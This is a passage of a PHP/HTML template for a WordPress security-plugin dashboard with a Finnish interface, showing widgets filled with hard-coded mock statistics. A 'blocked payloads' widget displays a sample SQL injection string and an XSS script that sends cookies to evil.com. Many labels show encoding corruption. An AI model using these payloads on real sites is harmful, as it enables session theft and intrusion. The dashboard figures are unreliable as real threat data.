.btn-dismiss {
  padding: 8px 18px; border-radius: 8px; border: 1px solid #e5e7eb;
  background: #fff; color: #374151; font-size: 13px; font-weight: 600;
  cursor: pointer; font-family: inherit; transition: background 0.15s;
}
.btn-dismiss:hover { background: #f9fafb; }
.btn-ban {
  padding: 8px 18px; border-radius: 8px; border: none;
  background: #dc2626; color: #fff; font-size: 13px; font-weight: 600;
  cursor: pointer; font-family: inherit; transition: background 0.15s;
}
.btn-ban:hover { background: #b91c1c; }

/* ï¿½"?ï¿½"? Lockdown overlay ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"? */
#lockdown-overlay {
  position: fixed; inset: 0; z-index: 300;
  background: rgba(127,0,0,0.96); backdrop-filter: blur(8px);
  display: flex; flex-direction: column; align-items: center; justify-content: center;
  opacity: 0; pointer-events: none; transition: opacity 0.4s;
}
#lockdown-overlay.open { opacity: 1; pointer-events: auto; }
#lockdown-overlay h1 { font-size: 36px; font-weight: 800; color: #fff; margin-top: 16px; }
#lockdown-overlay p  { font-size: 16px; color: rgba(255,255,255,0.7); margin-top: 8px; margin-bottom: 24px; }
.btn-disengage {
  padding: 12px 32px; background: #ef4444; color: #fff;
  border: none; border-radius: 10px; font-size: 14px; font-weight: 700;
  cursor: pointer; font-family: inherit; transition: background 0.15s;
}
.btn-disengage:hover { background: #dc2626; }

/* scrollbar */
::-webkit-scrollbar { width: 4px; }
::-webkit-scrollbar-track { background: transparent; }
::-webkit-scrollbar-thumb { background: rgba(0,0,0,0.12); border-radius: 4px; }
</style>

<div id="ps-shell">

  <!-- ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½
       SIDEBAR
  ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ -->
  <nav id="ps-sidebar">

    <button class="sidebar-toggle" id="sidebar-toggle" onclick="toggleSidebar()">
      <span class="material-symbols-outlined" id="sidebar-icon">menu_open</span>
    </button>

    <div class="sidebar-brand">
      <div class="sidebar-avatar">
        <?php echo get_avatar( get_current_user_id(), 76 ); ?>
      </div>
      <div class="sidebar-brand-text">
        <h2>Operaattorin<br>Konsoli</h2>
        <p>Tason 4 Oikeudet</p>
      </div>
    </div>

    <div class="sidebar-nav">
      <ul>
        <li>
          <a href="#" class="active" onclick="psOpenModule('none'); return false;">
            <span class="material-symbols-outlined">dashboard</span>
            <span class="nav-label">OhjausnÃ¤kymÃ¤</span>
          </a>
        </li>
        <li>
          <a href="#" onclick="psOpenModule('firewall'); return false;">
            <span class="material-symbols-outlined">shield</span>
            <span class="nav-label">Palomuuri & Sulut</span>
          </a>
        </li>
        <li>
          <a href="#" onclick="psOpenModule('hardening'); return false;">
            <span class="material-symbols-outlined">health_and_safety</span>
            <span class="nav-label">JÃ¤rjestelmÃ¤n Suojaus</span>
          </a>
        </li>
        <li>
          <a href="#" onclick="psOpenModule('scanner'); return false;">
            <span class="material-symbols-outlined">search_check</span>
            <span class="nav-label">Haittaohjelmien Skanneri</span>
          </a>
        </li>
        <li>
          <a href="#" onclick="psOpenModule('advanced'); return false;">
            <span class="material-symbols-outlined">settings_suggest</span>
            <span class="nav-label">LisÃ¤tyÃ¶kalut</span>
          </a>
        </li>
        <li>
          <a href="#" onclick="psOpenModule('headers'); return false;">
            <span class="material-symbols-outlined">http</span>
            <span class="nav-label">Tietoturvaotsikot</span>
          </a>
        </li>
        <li>
          <a href="#" onclick="psOpenModule('audit-log'); return false;">
            <span class="material-symbols-outlined">list_alt</span>
            <span class="nav-label">Tarkastusloki</span>
          </a>
        </li>
        <li>
          <a href="#" onclick="psOpenModule('notifications'); return false;">
            <span class="material-symbols-outlined">notifications</span>
            <span class="nav-label">Ilmoitukset</span>
          </a>
        </li>
        <li>
          <a href="#" onclick="psOpenModule('modules-overview'); return false;" id="nav-modules-overview">
            <span class="material-symbols-outlined">extension</span>
            <span class="nav-label">Tietoturvamoduulit</span>
          </a>
        </li>
      </ul>
    </div>

    <div class="sidebar-footer">
      <button class="btn-incident">
        <span class="material-symbols-outlined" style="font-size:15px;">add</span>
        <span class="incident-label">Poikkeamaraportti</span>
      </button>
      <div class="sidebar-footer-links">
        <a href="#">
          <span class="material-symbols-outlined">help_center</span>
          <span class="footer-label">Tuki</span>
        </a>
        <a href="#">
          <span class="material-symbols-outlined">terminal</span>
          <span class="footer-label">JÃ¤rjestelmÃ¤loki</span>
        </a>
      </div>
    </div>
  </nav>

  <!-- ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½
       MAIN AREA
  ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ -->
  <div id="ps-main">

    <!-- Header -->
    <header id="ps-header">
      <h1>Pecodex Security</h1>
      <div class="header-search">
        <span class="material-symbols-outlined">search</span>
        <input type="text" placeholder="Hae jÃ¤rjestelmistÃ¤ï¿½?ï¿½" id="header-search"/>
      </div>
      
      <div class="widget-toggles">
        <button id="toggle-all-widgets" class="widget-toggle" title="Piilota kaikki widgetit" style="background: #f8fafc; color: #475569; border-color: #cbd5e1; margin-right: 8px;">
          <span class="material-symbols-outlined" id="toggle-all-icon">visibility_off</span>
        </button>
        <button class="widget-toggle active" data-target="w-resources" title="Vaihda jÃ¤rjestelmÃ¤resurssit">
          <span class="material-symbols-outlined">memory</span>
        </button>
        <button class="widget-toggle active" data-target="w-traffic" title="Vaihda Liikenne">
          <span class="material-symbols-outlined">monitoring</span>
        </button>
        <button class="widget-toggle active" data-target="w-heatmap" title="Vaihda Uhkien LÃ¤hdekartta">
          <span class="material-symbols-outlined">public</span>
        </button>
        <button class="widget-toggle active" data-target="w-log" title="Vaihda Reaaliaikainen Tapahtumaloki">
          <span class="material-symbols-outlined">list_alt</span>
        </button>
        <button class="widget-toggle active" data-target="w-rate" title="Vaihda WAF-nopeusrajoitus">
          <span class="material-symbols-outlined">speed</span>
        </button>
        <button class="widget-toggle active" data-target="w-node-health" title="Vaihda Solmun Tila">
          <span class="material-symbols-outlined">hub</span>
        </button>
        <button class="widget-toggle active" data-target="w-payloads" title="Vaihda Estetyt Kuormat">
          <span class="material-symbols-outlined">bug_report</span>
        </button>
        <button class="widget-toggle active" data-target="w-controls" title="Vaihda Hallinta">
          <span class="material-symbols-outlined">admin_panel_settings</span>
        </button>
        <button class="widget-toggle active" data-target="w-malware" title="Vaihda Haittaohjelmat & Tiedostojen Eheys">
          <span class="material-symbols-outlined">pest_control</span>
        </button>
        <button class="widget-toggle active" data-target="w-vulnerabilities" title="Vaihda HaavoittuvuushÃ¤lytykset">
          <span class="material-symbols-outlined">security_update_warning</span>
        </button>
        <button class="widget-toggle active" data-target="w-login-security" title="Vaihda Kirjautumisen Tietoturva">
          <span class="material-symbols-outlined">no_accounts</span>
        </button>
        <button class="widget-toggle active" data-target="w-audit" title="Vaihda Tarkastusloki">
          <span class="material-symbols-outlined">manage_search</span>
        </button>
        <button class="widget-toggle active" data-target="w-hardening" title="Vaihda JÃ¤rjestelmÃ¤n Suojaus">
          <span class="material-symbols-outlined">shield_with_heart</span>
        </button>
      </div>

      <div class="header-actions">
        <button class="header-icon-btn"><span class="material-symbols-outlined">notifications</span></button>
        <button class="header-icon-btn"><span class="material-symbols-outlined">settings</span></button>
        <div class="header-avatar">
          <?php echo get_avatar( get_current_user_id(), 64 ); ?>
        </div>
      </div>
    </header>

    <!-- Map + Widget area -->
    <div id="ps-map-area">

      <!-- Leaflet map -->
      <div id="security-map"></div>

      <!-- Attack lines SVG (screen-space, managed by JS) -->
      <svg id="attack-svg" style="position:absolute;inset:0;width:100%;height:100%;z-index:5;pointer-events:none;overflow:visible;">
        <defs>
          <marker id="arrow-red" markerWidth="6" markerHeight="6" refX="3" refY="3" orient="auto">
            <path d="M0,0 L6,3 L0,6 Z" fill="#dc2626"/>
          </marker>
          <marker id="arrow-yellow" markerWidth="6" markerHeight="6" refX="3" refY="3" orient="auto">
            <path d="M0,0 L6,3 L0,6 Z" fill="#f59e0b"/>
          </marker>
          <marker id="arrow-green" markerWidth="6" markerHeight="6" refX="3" refY="3" orient="auto">
            <path d="M0,0 L6,3 L0,6 Z" fill="#22c55e"/>
          </marker>
        </defs>
        <!-- Paths drawn by JS after map tiles load -->
      </svg>

      <!-- Widgets overlay (on map) -->
      <div id="ps-widgets" class="dashboard-grid">
        <div id="maximize-backdrop"></div>
        
        <div class="grid-cell" id="cell-0" data-cell="0">
          <!-- 1. System Resources -->
          <div class="glass-card widget-resources" id="w-resources">
            <span class="material-symbols-outlined drag-handle">drag_indicator</span><button class="widget-maximize" title="Suurenna"><span class="material-symbols-outlined">open_in_full</span></button>
            <h4>
              <span class="material-symbols-outlined">memory</span>
              JÃ¤rjestelmÃ¤resurssit
            </h4>
            <div class="res-row">
              <div class="res-row-head"><span>Suorittimen KÃ¤yttÃ¶</span><span>42%</span></div>
              <div class="res-bar"><div class="res-bar-fill" style="width:42%"></div></div>
            </div>
            <div class="res-row">
              <div class="res-row-head"><span>Muisti</span><span>6.4GB / 16GB</span></div>
              <div class="res-bar"><div class="res-bar-fill" style="width:40%"></div></div>
            </div>
          </div>
        </div>

        <div class="grid-cell" id="cell-1" data-cell="1">
          <!-- 3. Uhan LÃ¤hde Heatmap [NEW] -->
          <div class="glass-card p-4 w-[360px]" id="w-heatmap">
            <span class="material-symbols-outlined drag-handle" style="top:12px;left:12px;">drag_indicator</span><button class="widget-maximize" title="Suurenna"><span class="material-symbols-outlined">open_in_full</span></button>
            <div class="flex items-center gap-2 mb-3 mt-1 ml-5">
              <span class="material-symbols-outlined text-pink-600">public</span>
              <h3 class="font-bold text-slate-800 text-sm">Pahimmat HyÃ¶kkÃ¤Ã¤jÃ¤t</h3>
            </div>
            <div class="flex flex-col gap-2">
              <div class="flex items-center justify-between text-xs">
                <div class="flex items-center gap-2"><span class="w-4 h-3 bg-red-500 rounded-sm"></span> CN (Beijing)</div>
                <span class="font-mono font-bold text-slate-700">14,205</span>
              </div>
              <div class="flex items-center justify-between text-xs">
                <div class="flex items-center gap-2"><span class="w-4 h-3 bg-orange-500 rounded-sm"></span> IR (Tehran)</div>
                <span class="font-mono font-bold text-slate-700">8,102</span>
              </div>
              <div class="flex items-center justify-between text-xs">
                <div class="flex items-center gap-2"><span class="w-4 h-3 bg-yellow-500 rounded-sm"></span> RU (Moscow)</div>
                <span class="font-mono font-bold text-slate-700">5,433</span>
              </div>
              <div class="flex items-center justify-between text-xs">
                <div class="flex items-center gap-2"><span class="w-4 h-3 bg-blue-500 rounded-sm"></span> US (Ashburn)</div>
                <span class="font-mono font-bold text-slate-700">2,110</span>
              </div>
            </div>
          </div>
          <!-- Vulnerability Alerts [NEW] -->
          <div class="glass-card p-4 w-[360px]" id="w-vulnerabilities">
            <span class="material-symbols-outlined drag-handle" style="top:12px;left:12px;">drag_indicator</span><button class="widget-maximize" title="Suurenna"><span class="material-symbols-outlined">open_in_full</span></button>
            <div class="flex items-center justify-between mb-3 mt-1 ml-5">
              <div class="flex items-center gap-2">
                <span class="material-symbols-outlined text-red-600">security_update_warning</span>
                <h3 class="font-bold text-slate-800 text-sm">Haavoittuvuudet</h3>
              </div>
              <span class="bg-red-100 text-red-800 text-[10px] font-bold px-2 py-0.5 rounded-full">3 KriittistÃ¤</span>
            </div>
            <div class="flex flex-col gap-2">
              <div class="flex justify-between items-center text-xs p-2 bg-red-50 border border-red-100 rounded">
                <div>
                  <div class="font-bold text-slate-800">WooCommerce</div>
                  <div class="text-[10px] text-slate-500">CVE-2024-1234 (RCE)</div>
                </div>
                <button class="text-[10px] bg-white border border-slate-200 px-2 py-1 rounded font-bold hover:bg-slate-50">PÃ¤ivitÃ¤</button>
              </div>
              <div class="flex justify-between items-center text-xs p-2 bg-orange-50 border border-orange-100 rounded">
                <div>
                  <div class="font-bold text-slate-800">Elementor</div>
                  <div class="text-[10px] text-slate-500">CVE-2024-5678 (XSS)</div>
                </div>
                <button class="text-[10px] bg-white border border-slate-200 px-2 py-1 rounded font-bold hover:bg-slate-50">PÃ¤ivitÃ¤</button>
              </div>
            </div>
            <div class="widget-settings-panel">
              <h4 class="text-sm font-bold text-slate-700 mb-2">Asetukset</h4>
              <label class="flex items-center gap-2 text-xs text-slate-600 mb-2">
                <input type="checkbox" checked class="rounded border-slate-300 text-pink-600 focus:ring-pink-500">
                PÃ¤ivitÃ¤ kriittiset haavoittuvuudet automaattisesti
              </label>
              <label class="flex items-center gap-2 text-xs text-slate-600">
                <input type="checkbox" class="rounded border-slate-300 text-pink-600 focus:ring-pink-500">
                LÃ¤hetÃ¤ sÃ¤hkÃ¶posti-ilmoitus uusista uhista
              </label>
            </div>
          </div>
        </div>

        <div class="grid-cell" id="cell-2" data-cell="2">
          <!-- 4. Tactical Modules (20) -->
          <div class="glass-card widget-controls" id="w-controls" style="width: 580px;">
            <span class="material-symbols-outlined drag-handle" style="top:12px;left:12px;">drag_indicator</span><button class="widget-maximize" title="Suurenna"><span class="material-symbols-outlined">open_in_full</span></button>
            <div class="widget-controls-inner" style="height: auto; padding: 18px;">
              <div class="ctrl-header" style="margin-left: 12px; margin-bottom: 12px;">
                <span class="material-symbols-outlined text-blue-600">security</span>
                <h3 style="font-size: 16px; text-transform: uppercase; letter-spacing: 1px;">Tietoturvamoduulit (20)</h3>
              </div>
              <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px; max-height: 380px; overflow-y: auto; padding-right: 8px;">
                <?php
                $active_modules = get_option('pmc_active_modules', array());
                $is_first_run = empty($active_modules);
                
                $modules = [
                  ['id' => 'waf', 'name' => 'WAF-moottori', 'icon' => 'shield', 'color' => '#3b82f6'],
                  ['id' => 'bot', 'name' => 'Bottisuojaus', 'icon' => 'smart_toy', 'color' => '#14b8a6'],
                  ['id' => 'geoip', 'name' => 'GeoIP-sÃ¤Ã¤nnÃ¶t', 'icon' => 'public', 'color' => '#6366f1'],
                  ['id' => 'honeypot', 'name' => 'Hunajapurkit', 'icon' => 'bug_report', 'color' => '#ec4899'],
                  ['id' => 'zerotrust', 'name' => 'Zero Trust', 'icon' => 'fingerprint', 'color' => '#a855f7'],
                  ['id' => 'webauthn', 'name' => 'WebAuthn', 'icon' => 'passkey', 'color' => '#22c55e'],
                  ['id' => 'lockdown', 'name' => 'Sulkutila', 'icon' => 'lock_person', 'color' => '#ef4444'],
                  ['id' => 'firewall', 'name' => 'Verkkopalomuuri', 'icon' => 'router', 'color' => '#f97316'],
                  ['id' => 'hardening', 'name' => 'Ytimen Suojaus', 'icon' => 'gpp_good', 'color' => '#14b8a6'],
                  ['id' => 'advanced', 'name' => 'Kehittynyt AI-turva', 'icon' => 'memory', 'color' => '#6366f1'],
                  ['id' => 'scanner', 'name' => 'Haittaohjelmien Skanneri', 'icon' => 'troubleshoot', 'color' => '#3b82f6'],
                  ['id' => 'deepscanner', 'name' => 'SyvÃ¤heuristiikka', 'icon' => 'biotech', 'color' => '#ec4899'],
                  ['id' => 'captcha', 'name' => 'ï¿½"lykÃ¤s Captcha', 'icon' => 'fact_check', 'color' => '#f97316'],
                  ['id' => 'telemetry', 'name' => 'Reaaliaikainen Telemetria', 'icon' => 'radar', 'color' => '#3b82f6'],
                  ['id' => 'cache', 'name' => 'Turvallinen VÃ¤limuisti', 'icon' => 'cached', 'color' => '#22c55e'],
                  ['id' => 'encryption', 'name' => 'Tietojen Salaus', 'icon' => 'key', 'color' => '#a855f7'],
                  ['id' => 'appsec', 'name' => 'Sovellusturva', 'icon' => 'app_blocking', 'color' => '#ef4444'],
                  ['id' => 'audit', 'name' => 'Tarkastusloki', 'icon' => 'manage_search', 'color' => '#14b8a6'],
                  ['id' => 'auth', 'name' => 'Tunnistautumisen Suojat', 'icon' => 'admin_panel_settings', 'color' => '#6366f1'],
                  ['id' => 'wizard', 'name' => 'API-yhdyskÃ¤ytÃ¤vÃ¤', 'icon' => 'api', 'color' => '#3b82f6'],
                ];
                foreach ($modules as $mod):
                  $is_active = $is_first_run ? true : !empty($active_modules[$mod['id']]);
                  $checked = $is_active ? 'checked' : '';
                ?>
                <div class="ctrl-row" style="background: rgba(255,255,255,0.6); border: 1px solid rgba(0,0,0,0.05); padding: 8px 12px; border-radius: 8px; transition: background 0.2s;" onmouseover="this.style.background='rgba(255,255,255,0.9)'" onmouseout="this.style.background='rgba(255,255,255,0.6)'">
                  <div style="display: flex; align-items: center; gap: 8px;">
                    <span class="material-symbols-outlined" style="color: <?php echo $mod['color']; ?>; font-size: 18px;"><?php echo $mod['icon']; ?></span>
                    <span style="font-weight: 700; color: #334155; font-size: 13px;"><?php echo $mod['name']; ?></span>
                  </div>
                  <label class="toggle-wrap">
                    <input type="checkbox" class="module-toggle-checkbox" data-module="<?php echo esc_attr($mod['id']); ?>" <?php echo $checked; ?> onchange="pmcSaveActiveModules()"/>
                    <span class="toggle-track"><span class="toggle-thumb"></span></span>
                  </label>
                </div>
                <?php endforeach; ?>
              </div>
              <div class="ctrl-footer" style="margin-top: 14px; border-top: 1px solid rgba(0,0,0,0.05); padding-top: 14px;">
                <button class="btn-lockdown" onclick="triggerLockdown()" style="width: 100%; background: #ef4444; color: #fff; border: none; font-size: 14px; padding: 12px; border-radius: 8px; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; box-shadow: 0 4px 12px rgba(239, 68, 68, 0.4); transition: transform 0.1s, box-shadow 0.1s;" onmouseover="this.style.transform='scale(1.01)'; this.style.boxShadow='0 6px 16px rgba(239, 68, 68, 0.6)'" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 4px 12px rgba(239, 68, 68, 0.4)'">
                  <span class="material-symbols-outlined" style="margin-right: 8px;">dangerous</span>
                  KÃ¤ynnistÃ¤ TÃ¤ysi Sulkutila
                </button>
              </div>
            </div>
          </div>
        </div>

        <div class="grid-cell" id="cell-3" data-cell="3">
          <!-- 5. Live Event Log -->
          <div class="glass-card widget-log" id="w-log">
            <span class="material-symbols-outlined drag-handle" style="top:10px;left:10px;">drag_indicator</span><button class="widget-maximize" title="Suurenna"><span class="material-symbols-outlined">open_in_full</span></button>
            <div class="widget-log-inner">
              <div class="log-header">
                <h3>Reaaliaikainen Tapahtumaloki</h3>
                <span class="badge-active"><span class="badge-dot"></span>Aktiivinen Seuranta</span>
              </div>
              <div class="log-table-wrap">
                <table class="log-table">
                  <thead>
                    <tr>
                      <th>Aikaleima (UTC)</th>
                      <th>LÃ¤hde</th>
                      <th>Kohde</th>
                      <th>HyÃ¶kkÃ¤ys</th>
                      <th style="text-align:right">Status</th>
                    </tr>
                  </thead>
                  <tbody id="event-log-body">
                    <tr>
                      <td class="td-time">14:32:01</td>
                      <td>CN ï¿½?" Beijing</td>
                      <td>Helsinki-Edge-4</td>
                      <td>DDoS</td>
                      <td style="text-align:right"><span class="badge-status badge-critical">Kriittinen</span></td>
                    </tr>
                    <tr>
                      <td class="td-time">14:31:45</td>
                      <td>US ï¿½?" Ashburn</td>
                      <td>Vantaa-DC-01</td>
                      <td>SQLi</td>
                      <td style="text-align:right"><span class="badge-status badge-blocked">Estetty</span></td>
                    </tr>
                  </tbody>
                </table>
              </div>
            </div>
          </div>
          <!-- Audit Trail [NEW] -->
          <div class="glass-card p-4 w-[500px]" id="w-audit">
            <span class="material-symbols-outlined drag-handle" style="top:12px;left:12px;">drag_indicator</span><button class="widget-maximize" title="Suurenna"><span class="material-symbols-outlined">open_in_full</span></button>
            <div class="flex items-center gap-2 mb-3 mt-1 ml-5">
              <span class="material-symbols-outlined text-slate-600">manage_search</span>
              <h3 class="font-bold text-slate-800 text-sm">Tarkastusloki</h3>
            </div>
            <div class="flex flex-col gap-2">
              <div class="flex gap-3 text-xs border-b border-slate-100 pb-2">
                <span class="text-slate-400 font-mono">14:22</span>
                <span class="font-bold text-indigo-600 w-16">pepeu</span>
                <span class="text-slate-700">Deaktivoi lisÃ¤osan <span class="font-mono bg-slate-100 px-1 rounded">hello-dolly</span></span>
              </div>
              <div class="flex gap-3 text-xs border-b border-slate-100 pb-2">
                <span class="text-slate-400 font-mono">13:05</span>
                <span class="font-bold text-indigo-600 w-16">admin</span>
                <span class="text-slate-700">Muutti WP-asetuksia (Kestolinkit)</span>
              </div>
              <div class="flex gap-3 text-xs border-b border-slate-100 pb-2">
                <span class="text-slate-400 font-mono">10:14</span>
                <span class="font-bold text-red-600 w-16">SYSTEM</span>
                <span class="text-slate-700">Estetty 45 kirjautumisyritystÃ¤ osoitteesta <span class="font-mono bg-red-50 text-red-700 px-1 rounded">192.168.1.1</span></span>
              </div>
            </div>
          </div>
        </div>

        <div class="grid-cell" id="cell-4" data-cell="4">
          <!-- Center is empty by default -->
        </div>

        <div class="grid-cell" id="cell-5" data-cell="5">
          <!-- 2. Traffic -->
          <div class="glass-card widget-traffic" id="w-traffic">
            <span class="material-symbols-outlined drag-handle">drag_indicator</span><button class="widget-maximize" title="Suurenna"><span class="material-symbols-outlined">open_in_full</span></button>
            <h4>
              <span class="material-symbols-outlined">monitoring</span>
              Liikenne
            </h4>
            <div class="traffic-val">1.2<span> GB/s</span></div>
            <div class="traffic-label">Saapuva</div>
            <div class="traffic-bars">
              <div class="traffic-bar" style="height:40%"></div>
              <div class="traffic-bar" style="height:60%"></div>
              <div class="traffic-bar active" style="height:100%"></div>
              <div class="traffic-bar" style="height:55%"></div>
              <div class="traffic-bar" style="height:30%"></div>
            </div>
          </div>
          <!-- System Hardening [NEW] -->
          <div class="glass-card p-4 w-[280px]" id="w-hardening">
            <span class="material-symbols-outlined drag-handle" style="top:12px;left:12px;">drag_indicator</span><button class="widget-maximize" title="Suurenna"><span class="material-symbols-outlined">open_in_full</span></button>
            <div class="flex items-center gap-2 mb-3 mt-1 ml-5">
              <span class="material-symbols-outlined text-teal-600">shield_with_heart</span>
              <h3 class="font-bold text-slate-800 text-sm">JÃ¤rjestelmÃ¤n Suojaus</h3>
            </div>
            <div class="flex flex-col gap-2" id="w-hardening-list">
              <div class="text-xs text-slate-400">Ladataan tietoja...</div>
            </div>
          </div>
        </div>

        <div class="grid-cell" id="cell-6" data-cell="6">
          <!-- 8. Blocked Payloads [NEW] -->
          <div class="glass-card p-4 w-[500px]" id="w-payloads">
            <span class="material-symbols-outlined drag-handle" style="top:12px;left:12px;">drag_indicator</span><button class="widget-maximize" title="Suurenna"><span class="material-symbols-outlined">open_in_full</span></button>
            <div class="flex items-center gap-2 mb-2 ml-5">
              <span class="material-symbols-outlined text-purple-600">bug_report</span>
              <h3 class="font-bold text-slate-800 text-sm">Estetyt Kuormat (Reaaliaikainen)</h3>
            </div>
            <div class="font-mono text-[11px] text-pink-700 bg-pink-50 border border-pink-100 p-2 rounded truncate">
              <span class="font-bold text-pink-900 mr-2">[SQLi]</span>
              SELECT * FROM users WHERE username = 'admin' OR '1'='1' -- 
            </div>
            <div class="font-mono text-[11px] text-purple-700 bg-purple-50 border border-purple-100 p-2 rounded mt-1 truncate">
              <span class="font-bold text-purple-900 mr-2">[XSS]</span>
              &lt;script&gt;fetch('http://evil.com/?c='+document.cookie)&lt;/script&gt;
            </div>
          </div>
          <!-- Malware & File Integrity [NEW] -->
          <div class="glass-card p-4 w-[500px]" id="w-malware">
            <span class="material-symbols-outlined drag-handle" style="top:12px;left:12px;">drag_indicator</span><button class="widget-maximize" title="Suurenna"><span class="material-symbols-outlined">open_in_full</span></button>
            <div class="flex items-center justify-between mb-3 mt-1 ml-5">
              <div class="flex items-center gap-2">
                <span class="material-symbols-outlined text-green-600">pest_control</span>
                <h3 class="font-bold text-slate-800 text-sm">Tiedostojen Eheyden Skanneri</h3>
              </div>
              <span class="text-xs text-slate-400">Viimeisin skannaus: 2h sitten</span>
            </div>
            <div class="grid grid-cols-3 gap-3 mb-3">
              <div class="bg-slate-50 p-2 rounded border border-slate-100 text-center">
                <div class="text-xl font-black text-slate-700">0</div>
                <div class="text-[10px] uppercase text-slate-500 font-bold">Saastunut</div>
              </div>
              <div class="bg-slate-50 p-2 rounded border border-slate-100 text-center">
                <div class="text-xl font-black text-slate-700">1</div>
                <div class="text-[10px] uppercase text-slate-500 font-bold">Muokattu</div>
              </div>
              <div class="bg-slate-50 p-2 rounded border border-slate-100 text-center">
                <div class="text-xl font-black text-slate-700">2</div>
                <div class="text-[10px] uppercase text-slate-500 font-bold">Karanteeni</div>
              </div>
            </div>
            <div class="text-xs text-slate-600 bg-yellow-50 p-2 rounded border border-yellow-100">
              <span class="font-bold text-yellow-800">Huomio:</span> Core file <span class="font-mono">wp-settings.php</span> on hiljattain muokattu.
            </div>
          </div>
        </div>

        <div class="grid-cell" id="cell-7" data-cell="7">
          <!-- 6. API Rate Limiter [NEW] -->
          <div class="glass-card p-4 flex flex-col justify-between w-[240px]" id="w-rate">
            <span class="material-symbols-outlined drag-handle" style="top:12px;left:12px;">drag_indicator</span><button class="widget-maximize" title="Suurenna"><span class="material-symbols-outlined">open_in_full</span></button>
            <div class="flex items-center gap-2 mb-2 ml-5">
              <span class="material-symbols-outlined text-indigo-600">speed</span>
              <h3 class="font-bold text-slate-800 text-sm">WAF-nopeusrajoitus</h3>
            </div>
            <div class="text-center my-1">
              <span class="text-2xl font-black text-slate-800">412</span>
              <span class="text-xs text-slate-500 font-bold ml-1">pyyntÃ¶Ã¤/s</span>
            </div>
            <div class="w-full bg-slate-200 rounded-full h-2.5 overflow-hidden">
              <div class="bg-indigo-600 h-2.5 rounded-full" style="width: 82%"></div>
            </div>
            <div class="flex justify-between text-[10px] text-slate-500 font-bold mt-1 uppercase">
              <span>0</span>
              <span class="text-pink-600">Raja: 500</span>
            </div>
            <div class="widget-settings-panel">
              <h4 class="text-sm font-bold text-slate-700 mb-2">Asetukset</h4>
              <div class="flex flex-col gap-2">
                <label class="text-xs text-slate-600">PyyntÃ¶raja (req/s)
                  <input type="number" value="500" class="w-full mt-1 px-2 py-1 border border-slate-200 rounded text-xs">
                </label>
                <label class="text-xs text-slate-600">Estoaika (min)
                  <input type="number" value="15" class="w-full mt-1 px-2 py-1 border border-slate-200 rounded text-xs">
                </label>
              </div>
            </div>
          </div>
          <!-- Login Security [NEW] -->
          <div class="glass-card p-4 w-[240px]" id="w-login-security">
            <span class="material-symbols-outlined drag-handle" style="top:12px;left:12px;">drag_indicator</span><button class="widget-maximize" title="Suurenna"><span class="material-symbols-outlined">open_in_full</span></button>
            <div class="flex items-center gap-2 mb-3 mt-1 ml-5">
              <span class="material-symbols-outlined text-blue-600">no_accounts</span>
              <h3 class="font-bold text-slate-800 text-sm">Kirjautumisen Tietoturva</h3>
            </div>
            <div class="flex justify-between items-center mb-2">
